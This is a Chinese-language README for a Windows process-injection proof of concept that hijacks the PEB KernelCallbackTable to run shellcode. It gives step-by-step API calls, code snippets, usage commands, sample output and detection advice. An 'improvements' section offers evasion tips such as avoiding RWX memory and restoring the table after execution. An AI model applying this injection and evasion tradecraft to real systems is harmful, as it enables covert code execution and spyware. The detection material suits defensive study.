# Kernel Callback Table Injection

## 概述

**Kernel Callback Table Injection** 是一种通过劫持 PEB (Process Environment Block) 中的 KernelCallbackTable 函数指针来执行 shellcode 的注入技术。该技术被 MITRE ATT&CK 归类为 T1574.013（Hijack Execution Flow: KernelCallbackTable），曾被 FinFisher/FinSpy 和 Lazarus 等威胁组织使用。

**原始项目**: [0xHossam/KernelCallbackTable-Injection-PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)

**MITRE ATT&CK**: [T1574.013 - Hijack Execution Flow: KernelCallbackTable](https://attack.mitre.org/techniques/T1574/013/)

## 技术原理

### 核心概念

**PEB (Process Environment Block)**:
- 每个进程的控制中心
- 存储进程关键信息（模块、堆、线程等）
- 地址可通过 `NtQueryInformationProcess` 获取

**KernelCallbackTable**:
- PEB 偏移 0x58 处的指针
- 指向函数指针数组
- 由 `user32.dll` 加载时初始化（仅 GUI 进程）
- 处理 Windows 消息回调

**核心思想**:
```
用户程序发送消息 → Windows 内核 → 调用 KernelCallbackTable 中的回调 → 我们劫持了这些回调!
```

### 技术流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 创建目标 GUI 进程（如 Notepad）                              │
│    CreateProcess("notepad.exe", ..., CREATE_NEW_CONSOLE, ...)  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 查找窗口句柄                                                 │
│    FindWindow("Notepad", NULL)                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 获取 PEB 地址                                                │
│    NtQueryInformationProcess(..., ProcessBasicInformation, ...) │
│    → PROCESS_BASIC_INFORMATION.PebBaseAddress                   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 读取 KernelCallbackTable 地址                                │
│    ReadProcessMemory(PEB + 0x58, ...)                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 读取 KernelCallbackTable 内容                                │
│    ReadProcessMemory(KernelCallbackTable, ...)                  │
│    → 获取 __fnCOPYDATA 等函数指针                               │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. 分配远程内存并写入 Shellcode                                 │
│    VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)                  │
│    WriteProcessMemory(..., shellcode, ...)                      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. 修改 KernelCallbackTable                                     │
│    table.__fnCOPYDATA = shellcode_address                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 8. 克隆修改后的表到远程进程                                     │
│    VirtualAllocEx + WriteProcessMemory                          │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 9. 更新 PEB->KernelCallbackTable 指针                           │
│    WriteProcessMemory(PEB + 0x58, &modified_table, ...)         │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 10. 触发回调执行 Shellcode                                      │
│     SendMessage(hWindow, WM_COPYDATA, ...)                      │
│     → Windows 调用 __fnCOPYDATA                                 │
│     → 执行我们的 shellcode!                                     │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. PEB 结构（简化）

```c
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;                      // +0x18
    // ...
    PVOID KernelCallbackTable;      // +0x58 ← 我们关心的字段
    // ...
} PEB, *PPEB;
```

**关键偏移**:
- x64: `PEB + 0x58` = KernelCallbackTable
- x86: `PEB + 0x2C` = KernelCallbackTable (不同架构偏移不同)

### 2. KernelCallbackTable 结构

```c
typedef struct _KERNEL_CALLBACK_TABLE {
    ULONG_PTR __fnCOPYDATA;          // 处理 WM_COPYDATA 消息
    ULONG_PTR __fnCOPYGLOBALDATA;
    ULONG_PTR __fnDWORD;
    ULONG_PTR __fnNCDESTROY;
    // ... 还有 ~90 个其他回调函数
} KERNEL_CALLBACK_TABLE;
```

**常用回调**:
- `__fnCOPYDATA` - WM_COPYDATA 消息（进程间数据传输）
- `__fnDWORD` - 通用 DWORD 参数消息
- `__fnNCDESTROY` - 窗口销毁消息

**为什么选择 __fnCOPYDATA**:
- 容易触发（SendMessage）
- 不会导致进程崩溃
- 常见合法消息，不可疑

### 3. 为什么只对 GUI 进程有效？

KernelCallbackTable 由 `user32.dll` 初始化：
```c
// 伪代码
when user32.dll loads:
    PEB->KernelCallbackTable = AllocateCallbackTable()
    InitializeCallbackFunctions()
```

**Console 应用**:
- 不加载 `user32.dll`
- `PEB->KernelCallbackTable` = NULL
- 无法使用此技术

**GUI 应用**:
- 自动加载 `user32.dll`
- KernelCallbackTable 已初始化
- 可以劫持

### 4. NtQueryInformationProcess

```c
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,  // ProcessBasicInformation = 0
    PVOID ProcessInformation,                  // → PROCESS_BASIC_INFORMATION
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
PVOID peb = pbi.PebBaseAddress;  // 得到 PEB 地址
```

**为什么使用这个 API**:
- 低级 NT API，直接访问进程内部
- 绕过高级 API 的限制
- EDR 可能监控不足

### 5. 触发机制

```c
// 发送 WM_COPYDATA 消息
COPYDATASTRUCT cds;
cds.dwData = 1;
cds.cbData = sizeof(data);
cds.lpData = data;

SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
```

**消息处理流程**:
```
SendMessage(WM_COPYDATA)
    → Windows 内核
    → 查找目标进程的 PEB->KernelCallbackTable
    → 调用 table->__fnCOPYDATA
    → 执行我们的 shellcode!
```

## 项目结构

```
10-kernel-callback-table/
├── README.md                         # 本文档
├── build.sh                          # Linux/macOS 构建脚本
├── build.bat                         # Windows 构建脚本
├── src/
│   ├── kernel_callback_injection.c   # 主注入器
│   └── generate_shellcode.c          # Shellcode 生成器
└── build/
    ├── kernel_callback_injection.exe # 主程序
    ├── generate_shellcode.exe        # Shellcode 工具
    └── payload.bin                   # 测试载荷
```

## 构建和使用

### 前置要求

- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **系统**: Windows 7+
- **目标**: GUI 应用（有窗口的进程）

### 构建步骤

```bash
# Windows
build.bat

# Linux/macOS (需要 MinGW 交叉编译)
bash build.sh
```

### 使用方法

```bash
cd build

# 基本用法（会创建 Notepad 作为目标）
kernel_callback_injection.exe payload.bin

# 生成自定义 payload
generate_shellcode.exe my_payload.bin
kernel_callback_injection.exe my_payload.bin
```

### 输出示例

```
===================================================================
Kernel Callback Table Injection
===================================================================

[*] Target Process: C:\Windows\System32\notepad.exe
[*] Payload Size: 19 bytes

[*] Step 1: Loading NT APIs...
[+] NtQueryInformationProcess loaded at: 0x00007FFB...

[*] Step 2: Creating target process...
[+] Process created (PID: 12345)

[*] Step 3: Waiting for process initialization...

[*] Step 4: Finding window handle...
[+] Window handle found: 0x000123456789AB

[*] Step 5: Opening process handle...
[+] Process ID: 12345
[+] Process handle: 0x000000000000012C

[*] Step 6: Retrieving PEB address...
[+] PEB Address: 0x00000012345678AB

[*] Step 7: Reading KernelCallbackTable...
[+] KernelCallbackTable Address: 0x00007FFB...
[+] Original __fnCOPYDATA: 0x00007FFB...

[*] Step 8: Allocating remote memory for payload...
[+] Remote payload buffer: 0x00000234567890AB
[+] Payload written (19 bytes)

[*] Step 9: Modifying KernelCallbackTable...
[+] Modified __fnCOPYDATA to point to: 0x00000234567890AB

[*] Step 10: Cloning modified KernelCallbackTable...
[+] Modified table written to: 0x00000345678901BC

[*] Step 11: Updating PEB->KernelCallbackTable...
[+] PEB->KernelCallbackTable updated successfully

[*] Step 12: Triggering payload via WM_COPYDATA...
[+] Payload triggered!

===================================================================
[+] Injection completed successfully!
===================================================================
```

## 技术限制

### 1. 目标限制

- **必须是 GUI 进程**
  - 需要加载 user32.dll
  - Console 应用无 KernelCallbackTable

- **必须有窗口**
  - 需要窗口句柄发送消息
  - 无窗口无法触发回调

### 2. 时序要求

- **进程必须完全初始化**
  - user32.dll 必须已加载
  - KernelCallbackTable 必须已初始化
  - 过早注入会失败

### 3. 架构依赖

- **偏移因架构而异**
  - x64: PEB + 0x58
  - x86: PEB + 0x2C
  - ARM: 不适用

### 4. 检测风险

- **PEB 修改**
  - EDR 可能监控 PEB 写入
  - 异常的 KernelCallbackTable 指针

- **RWX 内存**
  - Shellcode 通常需要 PAGE_EXECUTE_READWRITE
  - 可疑的内存保护

## 检测与防御

### 检测方法

**1. PEB 完整性检查**
```c
// 检测 KernelCallbackTable 是否在合法范围
PVOID table = PEB->KernelCallbackTable;
if (!IsInUser32Module(table)) {
    Alert("KernelCallbackTable hijacked!");
}
```

**2. 回调函数验证**
```c
// 检查 __fnCOPYDATA 是否指向 user32.dll
PVOID fnCOPYDATA = KernelCallbackTable->__fnCOPYDATA;
if (!IsInUser32Module(fnCOPYDATA)) {
    Alert("Callback function hijacked!");
}
```

**3. 内存扫描**
```
检测：
- RWX 内存区域
- 非模块内存中的可执行代码
- 异常的跨进程内存写入
```

**4. 行为监控**
```
可疑行为：
- OpenProcess + PROCESS_VM_WRITE
- WriteProcessMemory 写入 PEB 区域
- 修改只读内存区域
```

### 防御建议

**对于 EDR/AV**:
- 监控 PEB 区域的写入操作
- 验证 KernelCallbackTable 指针的合法性
- 检测 NtQueryInformationProcess 的异常使用

**对于管理员**:
- 启用 CFG (Control Flow Guard)
- 使用 EMET/Windows Defender Exploit Guard
- 应用最新安全补丁

**对于开发者**:
- 使用 Process Mitigation Policies
- 启用 ASLR 和 DEP
- 考虑使用 ACG (Arbitrary Code Guard)

## 改进方向

### 1. 更隐蔽的内存分配
```c
// 不使用 RWX，分阶段修改保护
VirtualAllocEx(..., PAGE_READWRITE);
WriteProcessMemory(..., shellcode, ...);
VirtualProtectEx(..., PAGE_EXECUTE_READ);
```

### 2. 多回调劫持
```c
// 不只劫持 __fnCOPYDATA，劫持多个回调
table->__fnDWORD = shellcode1;
table->__fnNCDESTROY = shellcode2;
// 增加冗余性和隐蔽性
```

### 3. 恢复原始表
```c
// 执行后恢复，减少检测
Execute_Shellcode();
RestoreOriginalKernelCallbackTable();
```

## 实战案例

### FinFisher/FinSpy

**使用场景**: 持久化和隐蔽执行
```
1. 劫持系统进程的 KernelCallbackTable
2. 等待特定窗口消息触发
3. 执行间谍软件功能
4. 恢复原始表避免检测
```

### Lazarus Group

**使用场景**: 载荷注入和横向移动
```
1. 注入到合法 GUI 进程（如 explorer.exe）
2. 利用正常的 Windows 消息触发
3. 绕过应用程序白名单
4. 执行二阶段载荷
```

## 参考资料

### 技术文章
- [0xHossam's PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)
- [MITRE ATT&CK T1574.013](https://attack.mitre.org/techniques/T1574/013/)

### Windows 内部机制
- [PEB Structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [Process Environment Block](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/)

### 相关技术
- [Early Cascade Injection](../09-early-cascade/) - 也利用 PEB 中的指针
- [DLL Blocking](../08-dll-blocking/) - 另一种劫持技术

## Credits

- **0xHossam** - 原始 PoC 实现
- **MITRE ATT&CK** - 技术分类和文档

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。
